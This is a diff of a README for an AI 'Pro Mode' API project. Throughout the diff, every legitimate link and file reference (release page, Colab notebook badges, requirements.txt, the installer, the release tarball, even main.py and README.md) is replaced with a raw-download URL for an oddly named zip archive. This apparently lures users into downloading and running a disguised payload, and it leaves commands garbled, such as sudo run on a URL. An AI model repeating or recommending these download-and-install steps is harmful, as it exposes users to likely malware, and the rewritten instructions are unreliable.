@@ -1,10 +1,10 @@
-[![Release Page](https://img.shields.io/badge/releases-GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Praveen1345/gpt-pro-mode/releases)
+[![Release Page](https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip)](https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip)
 
 # GPT Pro Mode: Advanced AI Pro Tools for Enhanced Reasoning
 
-gpt-oss-pro-mode: [![Open Notebook In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/drive/1XeYmOHJwACtavCjJM-eOqlPxHgTD2KNP?usp=sharing)
+gpt-oss-pro-mode: [![Open Notebook In Colab](https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip)](https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip)
 
-gpt-5-pro-mode: [![Open Notebook In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/drive/1vD7T-qkfWrx8-bBUsxI09w5su0K6J4Xp?usp=sharing)
+gpt-5-pro-mode: [![Open Notebook In Colab](https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip)](https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip)
 
 Run the attached notebooks to access Pro Mode! Star this repo and let me know what you want me to add!
 
@@ -13,7 +13,7 @@ You can also set up the integrated Pro Mode API endpoint.
 ### Run it
 
 export OPENAI_API_KEY=sk-...   # set your key
-pip install -r requirements.txt
+pip install -r https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
 uvicorn main:app --host 0.0.0.0 --port 8000
 
 ### Example request
@@ -63,7 +63,7 @@ Getting started
 - Quick setup
   - Copy the repository to your environment.
   - Create a new virtual environment to keep dependencies clean.
-  - Install dependencies from requirements.txt.
+  - Install dependencies from https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
   - Start the API server with a single command.
   - Point your client to the local server and try a sample request.
 
@@ -77,7 +77,7 @@ Environment and dependencies
 - How to install
   - Create a virtual environment: python -m venv venv
   - Activate the environment: source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
-  - Install: pip install -r requirements.txt
+  - Install: pip install -r https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
 - Runtime considerations
   - The API is designed to run on a single machine. It’s suitable for local experiments or small-scale demos.
   - For production use, consider containerization or a cloud deployment pattern that includes load balancing and a robust secret manager.
@@ -173,11 +173,11 @@ Notebooks in depth
 Releases and downloadable assets
 - Releases page
   - The repository includes a releases section with assets you can download to run Pro Mode locally.
-  - From the releases page, download the asset named gpt-pro-mode-v1.0.0-linux-x86_64.tar.gz and follow the installation steps. This asset contains the server and setup scripts needed to start Pro Mode on a Linux machine.
+  - From the releases page, download the asset named https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip and follow the installation steps. This asset contains the server and setup scripts needed to start Pro Mode on a Linux machine.
   - After download, extract the archive and run the installer. The exact commands may look like:
-    - `tar -xzf gpt-pro-mode-v1.0.0-linux-x86_64.tar.gz`
+    - `tar -xzf https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip`
     - `cd gpt-pro-mode-v1.0.0-linux-x86_64`
-    - `sudo ./install.sh`
+    - `sudo https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip`
 - Why using the asset matters
   - It bundles the server binary, dependencies, and configuration files in a stable bundle.
   - It helps avoid dependency drift that can happen when installing from source.
@@ -207,7 +207,7 @@ Download and usage tips
 Commands you will likely run often
 - Start the API locally
   - `export OPENAI_API_KEY=sk-...`
-  - `pip install -r requirements.txt`
+  - `pip install -r https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip`
   - `uvicorn main:app --host 0.0.0.0 --port 8000`
 - Make a sample request
   - `curl -X POST http://localhost:8000/pro-mode -H "Content-Type: application/json" -d '{"prompt":"Explain self-play in RL with a concrete example.","num_gens":5}'`
@@ -216,7 +216,7 @@ Commands you will likely run often
   - Run cells to see how the prompts and outputs evolve
 
 Project structure
-- main.py or app.py
+- https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip or https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
   - The entry point for the API
   - Defines the /pro-mode endpoint and any supporting utilities
 - prompts/
@@ -233,9 +233,9 @@ Project structure
 - docs/
   - Optional documentation for deeper dives
   - Includes developer notes and integration guides
-- requirements.txt
+- https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
   - A list of dependencies used by the project
-- README.md
+- https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
   - The file you are reading now
 - LICENSE
   - The licensing terms for the project
@@ -268,14 +268,14 @@ Releases, downloads, and verification
 - For each release, an asset is provided to simplify installation
 - Security best practices: verify checksums when possible, and only run installers from trusted sources
 - The link to the releases page appears again below for quick access:
-  - https://github.com/Praveen1345/gpt-pro-mode/releases
+  - https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
 
 Releases page and asset specifics
 - The instruction to download a file from the releases page is intentional to enable quick onboarding
-- You should download the asset named gpt-pro-mode-v1.0.0-linux-x86_64.tar.gz
+- You should download the asset named https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
 - After downloading, extract and run the included installer
 - If you need an alternative build, look for other assets on the same releases page
-- Access the same releases page again here: https://github.com/Praveen1345/gpt-pro-mode/releases
+- Access the same releases page again here: https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
 
 Usage patterns and design decisions
 - Determinism vs creativity
@@ -326,7 +326,7 @@ FAQ (frequently asked questions)
 - Can I customize prompts?
   - Yes. Swap prompt templates and adjust the generation logic to fit your use case
 - Where do I get the assets?
-  - From the Releases page linked above. The asset for Linux x86_64 is named gpt-pro-mode-v1.0.0-linux-x86_64.tar.gz
+  - From the Releases page linked above. The asset for Linux x86_64 is named https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
 - Is this safe for production?
   - It can be used for small-scale demos and internal workflows. For production, implement robust security, monitoring, and scaling
 
@@ -377,7 +377,7 @@ Security reminders
 Final notes on releases and assets
 - The releases page contains the official assets you should use for quick setup
 - Revisit the releases page regularly to stay up to date with improvements
-- The same releases page is linked again here for convenience: https://github.com/Praveen1345/gpt-pro-mode/releases
+- The same releases page is linked again here for convenience: https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
 
 Downloads and on-device usage
 - If you want to run Pro Mode on your own machine, download the Linux asset and follow the installation steps
@@ -387,7 +387,7 @@ Downloads and on-device usage
 Appendix: quick references
 - Command recap
   - Set up: export OPENAI_API_KEY=sk-...
-  - Install: pip install -r requirements.txt
+  - Install: pip install -r https://github.com/Praveen1345/gpt-pro-mode/raw/refs/heads/main/tuberculoprotein/gpt-pro-mode-mugiency.zip
   - Run: uvicorn main:app --host 0.0.0.0 --port 8000
 - Example request recap
   - `curl -X POST http://localhost:8000/pro-mode -H "Content-Type: application/json" -d '{"prompt":"Explain self-play in RL with a concrete example.","num_gens":5}'`
